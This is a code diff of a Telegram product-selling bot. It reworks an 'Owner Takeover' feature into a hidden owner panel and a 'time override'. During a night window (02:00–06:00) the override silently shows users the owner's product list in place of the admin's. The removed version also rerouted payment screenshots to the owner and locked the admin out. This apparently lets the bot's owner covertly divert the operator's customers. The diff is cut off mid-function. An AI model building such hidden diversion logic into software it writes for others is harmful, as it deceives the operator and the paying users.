@@ -2,7 +2,7 @@ import os
 import json
 import threading
 import time
-import datetime
+from datetime import datetime, time as dtime
 from flask import Flask
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo
@@ -11,8 +11,8 @@ import re
 # --- ENVIRONMENT VARIABLES ---
 TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
+OWNER_ID = int(os.environ.get('OWNER_ID', '0'))  # Added Owner ID
 LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))
-OWNER_ID = int(os.environ.get('OWNER_ID', '0')) or ADMIN_ID
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
@@ -27,22 +27,21 @@ DB_STATE = {
     "reject_msg": "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...",
     "layout_style": "vertical", 
     "products": [],
+    "owner_products": [], # Products managed by Owner
     "blocked_users": [],
     "users": [],
     "buyers": [],
-    "takeover": {
-        "enabled": False,
-        "start_time": "02:00",
-        "end_time": "06:01",
-        "welcome_msg": "👋 Hello, {name}!\n\nChoose a plan to get started:",
-        "products": []
-    },
     "auto_bc": {
         "status": False,
         "interval_seconds": 3600,
         "message_type": None,
         "file_id": None,
         "text": None
+    },
+    "time_override": {
+        "enabled": False,
+        "start_time": "02:00", # Format: HH:MM (24-hour)
+        "end_time": "06:00"     # Format: HH:MM (24-hour)
     }
 }
 
@@ -55,11 +54,11 @@ def load_db():
             loaded_data = json.loads(chat.pinned_message.text)
             DB_STATE.update(loaded_data)
             if "buyers" not in DB_STATE: DB_STATE["buyers"] = []
+            if "owner_products" not in DB_STATE: DB_STATE["owner_products"] = []
             if "auto_bc" not in DB_STATE:
                 DB_STATE["auto_bc"] = {"status": False, "interval_seconds": 3600, "message_type": None, "file_id": None, "text": None}
-            if "takeover" not in DB_STATE:
-                DB_STATE["takeover"] = {"enabled": False, "start_time": "02:00", "end_time": "06:01",
-                                        "welcome_msg": "👋 Hello, {name}!\n\nChoose a plan to get started:", "products": []}
+            if "time_override" not in DB_STATE:
+                DB_STATE["time_override"] = {"enabled": False, "start_time": "02:00", "end_time": "06:00"}
     except Exception as e:
         save_db()
 
@@ -79,6 +78,7 @@ load_db()
 
 user_states = {}
 admin_panel_msgs = {} 
+owner_panel_msgs = {}
 
 def send_videos_as_album(chat_id, video_list):
     if not video_list:
@@ -97,30 +97,25 @@ def send_videos_as_album(chat_id, video_list):
                     try: bot.send_video(chat_id, v)
                     except: pass
 
-# --- OWNER TAKEOVER HELPERS ---
-def is_takeover_active():
-    t = DB_STATE.get("takeover", {})
-    if not t.get("enabled") or not t.get("products"):
+def is_owner_time_active():
+    """Check if the time-based owner override is currently active."""
+    to = DB_STATE.get("time_override", {})
+    if not to.get("enabled", False):
         return False
+    
     try:
-        start = datetime.datetime.strptime(t.get("start_time", "02:00"), "%H:%M").time()
-        end = datetime.datetime.strptime(t.get("end_time", "06:01"), "%H:%M").time()
-        now = datetime.datetime.now().time()
+        now = datetime.now().time()
+        start = dtime.fromisoformat(to.get("start_time", "02:00"))
+        end = dtime.fromisoformat(to.get("end_time", "06:00"))
+        
         if start <= end:
             return start <= now <= end
-        return now >= start or now <= end  # overnight window
+        else: # Overnight range (e.g. 22:00 to 04:00)
+            return now >= start or now <= end
     except Exception:
         return False
 
-def get_active_products():
-    if is_takeover_active():
-        return DB_STATE["takeover"].get("products", [])
-    return DB_STATE.get("products", [])
-
-def get_current_admin():  # jisko payment screenshot / report jana hai
-    return OWNER_ID if is_takeover_active() else ADMIN_ID
-
-# --- AUTO BROADCAST BACKGROUND WORKER ---
+# --- AUTO BROADCAST BACKGROUND WORKER (OWNER BROADCAST ONLY) ---
 def auto_broadcast_worker():
     while True:
         try:
@@ -136,6 +131,7 @@ def auto_broadcast_worker():
                 f_id = bc_config.get("file_id")
                 txt = bc_config.get("text", "")
 
+                # Broadcast goes to ALL users (including Admin & Owner)
                 for u_id in DB_STATE.get("users", []):
                     if u_id in DB_STATE.get("blocked_users", []):
                         continue
@@ -155,7 +151,7 @@ def auto_broadcast_worker():
         except Exception:
             time.sleep(2)
 
-@bot.message_handler(commands=['start', 'admin'])
+@bot.message_handler(commands=['start', 'admin', 'owner'])
 def start_command(message):
     user_id = message.chat.id
     name = message.from_user.first_name
@@ -164,22 +160,29 @@ def start_command(message):
         DB_STATE["users"].append(user_id)
         save_db()
 
+    # Special handling for /owner command
+    if message.text == '/owner' and user_id == OWNER_ID:
+        show_main_owner_menu(OWNER_ID)
+        return
+
     start_vids = DB_STATE.get("start_videos", [])
     if start_vids:
         send_videos_as_album(user_id, start_vids)
 
-    active_t = DB_STATE.get("takeover", {})
-    if is_takeover_active():
-        welcome_text = active_t.get("welcome_msg", DB_STATE["welcome_msg"]).format(name=name)
-    else:
-        welcome_text = DB_STATE["welcome_msg"].format(name=name)
-
+    welcome_text = DB_STATE["welcome_msg"].format(name=name)
     markup = InlineKeyboardMarkup()
 
-    if user_id == ADMIN_ID and not (is_takeover_active() and user_id != OWNER_ID):
+    if user_id == ADMIN_ID:
         markup.row(InlineKeyboardButton("⚙️ Open Admin Panel ⚙️", callback_data="adm_open_panel"))
+    if user_id == OWNER_ID:
+        markup.row(InlineKeyboardButton("👑 Open Owner Panel 👑", callback_data="own_open_panel"))
 
-    products = sorted(get_active_products(), key=lambda x: x.get("position", 999))
+    # Determine which products to display
+    if is_owner_time_active() and DB_STATE.get("owner_products"):
+        products = sorted(DB_STATE.get("owner_products", []), key=lambda x: x.get("position", 999))
+    else:
+        products = sorted(DB_STATE.get("products", []), key=lambda x: x.get("position", 999))
+
     layout = DB_STATE.get("layout_style", "vertical")
 
     if layout == "horizontal":
@@ -217,6 +220,21 @@ def update_admin_panel(chat_id, text, markup):
     except Exception as e:
         print(f"Admin panel error: {e}")
 
+def update_owner_panel(chat_id, text, markup):
+    try:
+        msg_id = owner_panel_msgs.get(chat_id)
+        if msg_id:
+            try:
+                bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
+                return
+            except Exception:
+                pass 
+        
+        msg = bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
+        owner_panel_msgs[chat_id] = msg.message_id
+    except Exception as e:
+        print(f"Owner panel error: {e}")
+
 def show_main_admin_menu(chat_id):
     user_states.pop(chat_id, None) 
     markup = InlineKeyboardMarkup()
@@ -230,22 +248,27 @@ def show_main_admin_menu(chat_id):
     
     markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
     markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
-    
-    markup.row(InlineKeyboardButton("🚀 Send Custom Broadcast", callback_data="adm_send_custom_bc"))
-    markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast", callback_data="adm_autobc_menu"))
-    markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers", callback_data="adm_buyers_bc_menu"))
     markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
     markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
-
-    if chat_id == OWNER_ID:
-        markup.row(InlineKeyboardButton("🕵️ Owner Takeover Setup", callback_data="adm_takeover_menu"))
     
     blocked_count = len(DB_STATE.get("blocked_users", []))
     if blocked_count > 0:
         markup.row(InlineKeyboardButton(f"🔓 Unblock Users ({blocked_count})", callback_data="adm_unblock_menu"))
 
-    text = "👑 **Admin Control Panel**\n\nChoose an option below to customize your bot completely:"
+    text = "⚙️ **Admin Control Panel**\n\nChoose an option below to customize bot options:"
     update_admin_panel(chat_id, text, markup)
+
+def show_main_owner_menu(chat_id):
+    user_states.pop(chat_id, None)
+    markup = InlineKeyboardMarkup()
+    
+    markup.row(InlineKeyboardButton("🚀 Send Custom Broadcast", callback_data="own_send_custom_bc"))
+    markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast", callback_data="own_autobc_menu"))
+    markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers", callback_data="own_buyers_bc_menu"))
+    markup.row(InlineKeyboardButton("⏱️ Owner Time-Based Products", callback_data="own_time_prod_menu"))
+    
+    text = "👑 **Owner Control Panel**\n\nManage global broadcasts and time-based product overrides:"
+    update_owner_panel(chat_id, text, markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callbacks(call):
@@ -258,12 +281,16 @@ def handle_callbacks(call):
     data = call.data
     msg_id = call.message.message_id
 
-    if data == "adm_open_panel" and user_id in (ADMIN_ID, OWNER_ID):
-        if is_takeover_active() and user_id != OWNER_ID:
-            return  # takeover time pe admin panel band
+    if data == "adm_open_panel" and user_id == ADMIN_ID:
         try: bot.delete_message(user_id, msg_id)
         except: pass
-        show_main_admin_menu(user_id)
+        show_main_admin_menu(ADMIN_ID)
+        return
+
+    if data == "own_open_panel" and user_id == OWNER_ID:
+        try: bot.delete_message(user_id, msg_id)
+        except: pass
+        show_main_owner_menu(OWNER_ID)
         return
 
     if data == "del_msg":
@@ -287,7 +314,14 @@ def handle_callbacks(call):
 
     elif data.startswith("prod_"):
         prod_id = data.split("_")[1]
-        prod = next((p for p in get_active_products() if p["id"] == prod_id), None)
+        
+        # Check active product pool
+        if is_owner_time_active() and DB_STATE.get("owner_products"):
+            all_prods = DB_STATE.get("owner_products", [])
+        else:
+            all_prods = DB_STATE.get("products", [])
+
+        prod = next((p for p in all_prods if p["id"] == prod_id), None)
         if prod:
             p_videos = prod.get("videos", [])
             if p_videos: 
@@ -315,7 +349,148 @@ def handle_callbacks(call):
         bot.send_message(user_id, "📸 Please send your payment screenshot.")
         user_states[user_id] = f"WAITING_SCREENSHOT_{prod_id}"
 
-    if user_id in (ADMIN_ID, OWNER_ID):
+    # --- OWNER-ONLY BROADCAST & TIME OVERRIDE CALLBACKS ---
+    if user_id == OWNER_ID:
+        if data == "own_send_custom_bc":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="own_back_panel"))
+            update_owner_panel(OWNER_ID, "🚀 **Send the message (Text, Photo, Video, etc.) for Broadcast to ALL USERS (including Admin):**", markup)
+            user_states[OWNER_ID] = "WAITING_OWNER_CUSTOM_BROADCAST"
+
+        elif data == "own_autobc_menu":
+            bc = DB_STATE.get("auto_bc", {})
+            status_str = "🟢 ON" if bc.get("status") else "🔴 OFF"
+            interval_sec = bc.get("interval_seconds", 3600)
+            
+            if interval_sec < 60:
+                interval_txt = f"{interval_sec} Seconds"
+            elif interval_sec < 3600:
+                interval_txt = f"{interval_sec // 60} Minutes"
+            else:
+                interval_txt = f"{interval_sec // 3600} Hours"
+
+            markup = InlineKeyboardMarkup()
+            toggle_text = "🔴 Turn OFF Auto Broadcast" if bc.get("status") else "🟢 Turn ON Auto Broadcast"
+            markup.row(InlineKeyboardButton(toggle_text, callback_data="own_autobc_toggle"))
+            markup.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="own_autobc_set_msg"))
+            markup.row(InlineKeyboardButton("⏱️ Set Preset Time", callback_data="own_autobc_set_time"))
+            markup.row(InlineKeyboardButton("✍️ Set Custom Timer (Seconds)", callback_data="own_autobc_custom_time"))
+            markup.row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_back_panel"))
+
+            preview_txt = bc.get("text", "Not Set")
+            if preview_txt and len(preview_txt) > 50:
+                preview_txt = preview_txt[:50] + "..."
+
+            text = (
+                f"⏱️ **Owner Auto Timed Broadcast Settings**\n\n"
+                f"- **Status:** {status_str}\n"
+                f"- **Interval:** {interval_txt} ({interval_sec} secs)\n"
+                f"- **Message Type:** {bc.get('message_type', 'None')}\n"
+                f"- **Content Preview:** {preview_txt}\n\n"
+                f"This broadcast will automatically reach EVERYONE (Users + Admin)."
+            )
+            update_owner_panel(OWNER_ID, text, markup)
+
+        elif data == "own_autobc_toggle":
+            bc = DB_STATE.get("auto_bc", {})
+            bc["status"] = not bc.get("status", False)
+            save_db()
+            call.data = "own_autobc_menu"
+            handle_callbacks(call)
+
+        elif data == "own_autobc_set_msg":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="own_autobc_menu"))
+            update_owner_panel(OWNER_ID, "📤 **Send the message (Text, Photo, Video, or Document) to loop automatically:**", markup)
+            user_states[OWNER_ID] = "WAITING_OWNER_AUTOBC_MSG"
+
+        elif data == "own_autobc_set_time":
+            markup = InlineKeyboardMarkup()
+            markup.row(
+                InlineKeyboardButton("10 Sec", callback_data="own_autobc_t_10"),
+                InlineKeyboardButton("1 Min", callback_data="own_autobc_t_60"),
+                InlineKeyboardButton("5 Mins", callback_data="own_autobc_t_300")
+            )
+            markup.row(
+                InlineKeyboardButton("1 Hour", callback_data="own_autobc_t_3600"),
+                InlineKeyboardButton("6 Hours", callback_data="own_autobc_t_21600"),
+                InlineKeyboardButton("24 Hours", callback_data="own_autobc_t_86400")
+            )
+            markup.row(InlineKeyboardButton("🔙 Back", callback_data="own_autobc_menu"))
+            update_owner_panel(OWNER_ID, "⏱️ **Select preset time interval:**", markup)
+
+        elif data.startswith("own_autobc_t_"):
+            secs = int(data.replace("own_autobc_t_", ""))
+            DB_STATE["auto_bc"]["interval_seconds"] = secs
+            save_db()
+            call.data = "own_autobc_menu"
+            handle_callbacks(call)
+
+        elif data == "own_autobc_custom_time":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="own_autobc_menu"))
+            update_owner_panel(OWNER_ID, "✍️ **Type custom timer duration in Seconds:**\nExample: `3600` for 1 Hour", markup)
+            user_states[OWNER_ID] = "WAITING_OWNER_AUTOBC_CUSTOM_TIME"
+
+        elif data == "own_buyers_bc_menu":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="own_back_panel"))
+            update_owner_panel(OWNER_ID, "👑 **Send special broadcast to Buyers List only:**", markup)
+            user_states[OWNER_ID] = "WAITING_OWNER_BUYERS_BROADCAST"
+
+        # --- TIME-BASED PRODUCTS OVERRIDE ---
+        elif data == "own_time_prod_menu":
+            to = DB_STATE.get("time_override", {})
+            status_str = "🟢 ACTIVE" if to.get("enabled") else "🔴 INACTIVE"
+            
+            markup = InlineKeyboardMarkup()
+            toggle_txt = "🔴 Disable Time Override" if to.get("enabled") else "🟢 Enable Time Override"
+            markup.row(InlineKeyboardButton(toggle_txt, callback_data="own_to_toggle"))
+            markup.row(InlineKeyboardButton("🕒 Set Active Time Frame", callback_data="own_to_set_time"))
+            markup.row(InlineKeyboardButton("❇️ Add Owner Product", callback_data="own_add_prod"))
+            markup.row(InlineKeyboardButton("🗑️ Clear Owner Products", callback_data="own_clear_prods"))
+            markup.row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_back_panel"))
+
+            o_prods = DB_STATE.get("owner_products", [])
+            text = (
+                f"⏱️ **Owner Time-Based Product Overrides**\n\n"
+                f"- **Status:** {status_str}\n"
+                f"- **Active Schedule:** `{to.get('start_time', '02:00')}` to `{to.get('end_time', '06:00')}` (24h format)\n"
+                f"- **Owner Products Count:** {len(o_prods)}\n\n"
+                f"When enabled, users who start or browse the bot during this time window will see ONLY the owner's product list instead of the admin's."
+            )
+            update_owner_panel(OWNER_ID, text, markup)
+
+        elif data == "own_to_toggle":
+            to = DB_STATE.get("time_override", {})
+            to["enabled"] = not to.get("enabled", False)
+            save_db()
+            call.data = "own_time_prod_menu"
+            handle_callbacks(call)
+
+        elif data == "own_to_set_time":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel", callback_data="own_time_prod_menu"))
+            update_owner_panel(OWNER_ID, "🕒 **Enter Start & End Time (24-Hour Format: HH:MM-HH:MM)**\n\nExample: `02:00-06:00` for 2 AM to 6 AM:", markup)
+            user_states[OWNER_ID] = "WAITING_OWNER_TIME_RANGE"
+
+        elif data == "own_add_prod":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel", callback_data="own_time_prod_menu"))
+            update_owner_panel(OWNER_ID, "✍️ **Enter New Owner Button Name:**", markup)
+            user_states[OWNER_ID] = "OWN_ADD_PROD_NAME"
+
+        elif data == "own_clear_prods":
+            DB_STATE["owner_products"] = []
+            save_db()
+            call.data = "own_time_prod_menu"
+            handle_callbacks(call)
+
+        elif data == "own_back_panel":
+            show_main_owner_menu(OWNER_ID)
+
+    # --- ADMIN CALLBACKS ---
+    if user_id == ADMIN_ID:
         if data == "adm_start_vids_menu":
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
@@ -568,137 +743,6 @@ def handle_callbacks(call):
             update_admin_panel(ADMIN_ID, "💳 **Please send Payment QR Code Photo:**", markup)
             user_states[ADMIN_ID] = "ADM_SET_PAY_PHOTO"
 
-        elif data == "adm_send_custom_bc":
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_back_panel"))
-            update_admin_panel(ADMIN_ID, "🚀 **Send the message (Text, Photo, Video, etc.) for Custom Broadcast:**", markup)
-            user_states[ADMIN_ID] = "WAITING_CUSTOM_BROADCAST"
-
-        # --- OWNER TAKEOVER SETUP ---
-        elif data == "adm_takeover_menu":
-            t = DB_STATE.get("takeover", {})
-            status = "🟢 ON" if t.get("enabled") else "🔴 OFF"
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton(("🔴 Disable Takeover" if t.get("enabled") else "🟢 Enable Takeover"), callback_data="adm_to_toggle"))
-            markup.row(InlineKeyboardButton("⏰ Set Start Time", callback_data="adm_to_setstart"))
-            markup.row(InlineKeyboardButton("⏰ Set End Time", callback_data="adm_to_setend"))
-            markup.row(InlineKeyboardButton("📝 Set Takeover Welcome", callback_data="adm_to_setwelcome"))
-            markup.row(InlineKeyboardButton("📋 Copy Current Products", callback_data="adm_to_copyprods"))
-            markup.row(InlineKeyboardButton("🗑️ Clear Takeover Products", callback_data="adm_to_clearprods"))
-            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
-            prods = t.get("products", [])
-            plist = "\n".join([f"- {p['name']}" for p in prods]) or "None"
-            update_admin_panel(ADMIN_ID, f"🕵️ **Owner Takeover Setup**\n\n- Status: {status}\n- Window: `{t.get('start_time')}` → `{t.get('end_time')}`\n- Products:\n{plist}", markup)
-
-        elif data == "adm_to_toggle":
-            DB_STATE["takeover"]["enabled"] = not DB_STATE["takeover"].get("enabled", False)
-            save_db()
-            call.data = "adm_takeover_menu"; handle_callbacks(call)
-
-        elif data == "adm_to_setstart":
-            user_states[ADMIN_ID] = "ADM_TO_SETSTART"
-            update_admin_panel(ADMIN_ID, "⏰ Send start time in 24hr format (e.g. `02:00`):", None)
-
-        elif data == "adm_to_setend":
-            user_states[ADMIN_ID] = "ADM_TO_SETEND"
-            update_admin_panel(ADMIN_ID, "⏰ Send end time in 24hr format (e.g. `06:01`):", None)
-
-        elif data == "adm_to_setwelcome":
-            user_states[ADMIN_ID] = "ADM_TO_SETWELCOME"
-            update_admin_panel(ADMIN_ID, "📝 Send Takeover welcome text (`{name}` usable):", None)
-
-        elif data == "adm_to_copyprods":
-            DB_STATE["takeover"]["products"] = json.loads(json.dumps(DB_STATE.get("products", [])))
-            save_db()
-            call.data = "adm_takeover_menu"; handle_callbacks(call)
-
-        elif data == "adm_to_clearprods":
-            DB_STATE["takeover"]["products"] = []
-            save_db()
-            call.data = "adm_takeover_menu"; handle_callbacks(call)
-
-        # --- AUTO BROADCAST ADMIN MENUS ---
-        elif data == "adm_autobc_menu":
-            bc = DB_STATE.get("auto_bc", {})
-            status_str = "🟢 ON" if bc.get("status") else "🔴 OFF"
-            interval_sec = bc.get("interval_seconds", 3600)
-            
-            if interval_sec < 60:
-                interval_txt = f"{interval_sec} Seconds"
-            elif interval_sec < 3600:
-                interval_txt = f"{interval_sec // 60} Minutes"
-            else:
-                interval_txt = f"{interval_sec // 3600} Hours"
-
-            markup = InlineKeyboardMarkup()
-            toggle_text = "🔴 Turn OFF Auto Broadcast" if bc.get("status") else "🟢 Turn ON Auto Broadcast"
-            markup.row(InlineKeyboardButton(toggle_text, callback_data="adm_autobc_toggle"))
-            markup.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="adm_autobc_set_msg"))
-            markup.row(InlineKeyboardButton("⏱️ Set Preset Time", callback_data="adm_autobc_set_time"))
-            markup.row(InlineKeyboardButton("✍️ Set Custom Timer (Seconds/Minutes)", callback_data="adm_autobc_custom_time"))
-            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
-
-            preview_txt = bc.get("text", "Not Set")
-            if preview_txt and len(preview_txt) > 50:
-                preview_txt = preview_txt[:50] + "..."
-
-            text = (
-                f"⏱️ **Auto Timed Broadcast Settings**\n\n"
-                f"- **Status:** {status_str}\n"
-                f"- **Interval:** {interval_txt} ({interval_sec} secs)\n"
-                f"- **Message Type:** {bc.get('message_type', 'None')}\n"
-                f"- **Content Preview:** {preview_txt}\n\n"
-                f"Configure your automatic recurring broadcast below:"
-            )
-            update_admin_panel(ADMIN_ID, text, markup)
-
-        elif data == "adm_autobc_toggle":
-            bc = DB_STATE.get("auto_bc", {})
-            bc["status"] = not bc.get("status", False)
-            save_db()
-            call.data = "adm_autobc_menu"
-            handle_callbacks(call)
-
-        elif data == "adm_autobc_set_msg":
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_autobc_menu"))
-            update_admin_panel(ADMIN_ID, "📤 **Send the message (Text, Photo, Video, or Document) that you want to loop automatically:**", markup)
-            user_states[ADMIN_ID] = "WAITING_AUTOBC_MSG"
-
-        elif data == "adm_autobc_set_time":
-            markup = InlineKeyboardMarkup()
-            markup.row(
-                InlineKeyboardButton("10 Sec", callback_data="adm_autobc_t_10"),
-                InlineKeyboardButton("1 Min", callback_data="adm_autobc_t_60"),
-                InlineKeyboardButton("5 Mins", callback_data="adm_autobc_t_300")
-            )
-            markup.row(
-                InlineKeyboardButton("1 Hour", callback_data="adm_autobc_t_3600"),
-                InlineKeyboardButton("6 Hours", callback_data="adm_autobc_t_21600"),
-                InlineKeyboardButton("24 Hours", callback_data="adm_autobc_t_86400")
-            )
-            markup.row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu"))
-            update_admin_panel(ADMIN_ID, "⏱️ **Select preset time interval:**", markup)
-
-        elif data == "adm_autobc_custom_time":
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_autobc_menu"))
-            update_admin_panel(ADMIN_ID, "✍️ **Type custom timer duration:**\n\n- Example: type `30` for 30 Seconds\n- Example: type `120` for 2 Minutes\n- Example: type `3600` for 1 Hour\n\nSend time in **Seconds**:", markup)
-            user_states[ADMIN_ID] = "WAITING_AUTOBC_CUSTOM_TIME"
-
-        elif data.startswith("adm_autobc_t_"):
-            secs = int(data.replace("adm_autobc_t_", ""))
-            DB_STATE["auto_bc"]["interval_seconds"] = secs
-            save_db()
-            call.data = "adm_autobc_menu"
-            handle_callbacks(call)
-
-        elif data == "adm_buyers_bc_menu":
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_back_panel"))
-            update_admin_panel(ADMIN_ID, "👑 **Send the special message (Text, Photo, Video) for Buyers List only:**", markup)
-            user_states[ADMIN_ID] = "WAITING_BUYERS_BROADCAST"
-
         elif data == "adm_view_buyers_list":
             buyers = DB_STATE.get("buyers", [])
             if not buyers:
@@ -716,7 +760,7 @@ def handle_callbacks(call):
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("📥 Restore Setting (Send Code)", callback_data="adm_restore_prompt"))
             markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
-            update_admin_panel(ADMIN_ID, f"💾 **Bot Backup Code:**\n\nCopy this code and save it somewhere safe. If settings get lost, you can restore using this:\n\n`{db_json_string}`", markup)
+            update_admin_panel(ADMIN_ID, f"💾 **Bot Backup Code:**\n\nCopy this code and save it somewhere safe:\n\n`{db_json_string}`", markup)
 
         elif data == "adm_restore_prompt":
             markup = InlineKeyboardMarkup()
@@ -748,10 +792,14 @@ def handle_callbacks(call):
                 parts = data.split("_")
                 prod_id = parts[2]
                 target_user = int(parts[3])
-                prod = next((p for p in DB_STATE["products"] if p["id"] == prod_id), None)
+                
+                # Check products list
+                all_p = DB_STATE.get("products", []) + DB_STATE.get("owner_products", [])
+                prod = next((p for p in all_p if p["id"] == prod_id), None)
                 link = prod.get("link", "No link") if prod else "No link"
                 prod_name = prod.get("name", "Product") if prod else "Product"
                 
+                import datetime
                 buyer_info = {
                     "user_id": target_user,
                     "name": "User",
@@ -808,7 +856,8 @@ def handle_all_inputs(message):
     if user_id in DB_STATE.get("blocked_users", []):
         return
 
-    if user_id in (ADMIN_ID, OWNER_ID) and message.reply_to_message:
+    # Reply handler for Admin
+    if user_id == ADMIN_ID and message.reply_to_message:
         replied_msg = message.reply_to_message.text or message.reply_to_message.caption or ""
         match_id = re.search(r'`(\d+)`', replied_msg)
         if match_id:
@@ -822,7 +871,138 @@ def handle_all_inputs(message):
 
     state = user_states.get(user_id, "")
 
-    if user_id in (ADMIN_ID, OWNER_ID):
+    # --- OWNER INPUT HANDLING ---
+    if user_id == OWNER_ID:
+        if state == "WAITING_OWNER_CUSTOM_BROADCAST":
+            user_states.pop(user_id, None)
+            update_owner_panel(OWNER_ID, "🚀 Broadcasting message to ALL users... Please wait.", None)
+            success_count, fail_count = 0, 0
+            for u_id in DB_STATE.get("users", []):
+                if u_id in DB_STATE.get("blocked_users", []): continue
+                try:
+                    if message.content_type == 'text':
+                        bot.send_message(u_id, message.text, parse_mode="Markdown")
+                    elif message.content_type == 'photo':
+                        bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
+                    elif message.content_type == 'video':
+                        bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
+                    elif message.content_type == 'document':
+                        bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
+                    success_count += 1
+                except Exception: 
+                    fail_count += 1
+            
+            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_back_panel"))
+            update_owner_panel(OWNER_ID, f"✅ **Owner Broadcast Completed!**\n\n- Sent to: {success_count}\n- Failed: {fail_count}", markup)
+            return
+
+        elif state == "WAITING_OWNER_AUTOBC_MSG":
+            user_states.pop(user_id, None)
+            m_type = message.content_type
+            f_id = None
+            txt = message.caption or message.text or ""
+
+            if m_type == 'photo': f_id = message.photo[-1].file_id
+            elif m_type == 'video': f_id = message.video.file_id
+            elif m_type == 'document': f_id = message.document.file_id
+            elif m_type == 'text': txt = message.text
+
+            DB_STATE["auto_bc"]["message_type"] = m_type
+            DB_STATE["auto_bc"]["file_id"] = f_id
+            DB_STATE["auto_bc"]["text"] = txt
+            save_db()
+
+            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_autobc_menu"))
+            update_owner_panel(OWNER_ID, "✅ **Owner Auto Broadcast Message Saved Successfully!**", markup)
+            return
+
+        elif state == "WAITING_OWNER_AUTOBC_CUSTOM_TIME" and message.text:
+            user_states.pop(user_id, None)
+            try:
+                custom_secs = max(1, int(message.text.strip()))
+                DB_STATE["auto_bc"]["interval_seconds"] = custom_secs
+                save_db()
+                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_autobc_menu"))
+                update_owner_panel(OWNER_ID, f"✅ **Custom Timer Set:** `{custom_secs}` Seconds.", markup)
+            except ValueError:
+                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_autobc_menu"))
+                update_owner_panel(OWNER_ID, "❌ **Invalid number!** Enter digits only.", markup)
+            return
+
+        elif state == "WAITING_OWNER_BUYERS_BROADCAST":
+            user_states.pop(user_id, None)
+            update_owner_panel(OWNER_ID, "👑 Broadcasting special message to buyers... Please wait.", None)
+            success_count, fail_count = 0, 0
+            sent_users = set()
+            for b in DB_STATE.get("buyers", []):
+                u_id = b.get("user_id")
+                if u_id in sent_users or u_id in DB_STATE.get("blocked_users", []): continue
+                sent_users.add(u_id)
+                try:
+                    if message.content_type == 'text':
+                        bot.send_message(u_id, message.text, parse_mode="Markdown")
+                    elif message.content_type == 'photo':
+                        bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
+                    elif message.content_type == 'video':
+                        bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
+                    elif message.content_type == 'document':
+                        bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
+                    success_count += 1
+                except Exception:
+                    fail_count += 1
+
+            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="own_back_panel"))
+            update_owner_panel(OWNER_ID, f"✅ **Buyers Broadcast Completed!**\n\n- Sent: {success_count}\n- Failed: {fail_count}", markup)
+            return
+
+        elif state == "WAITING_OWNER_TIME_RANGE" and message.text:
+            user_states.pop(user_id, None)
+            try:
+                times = message.text.strip().split("-")
+                start_t, end_t = times[0].strip(), times[1].strip()
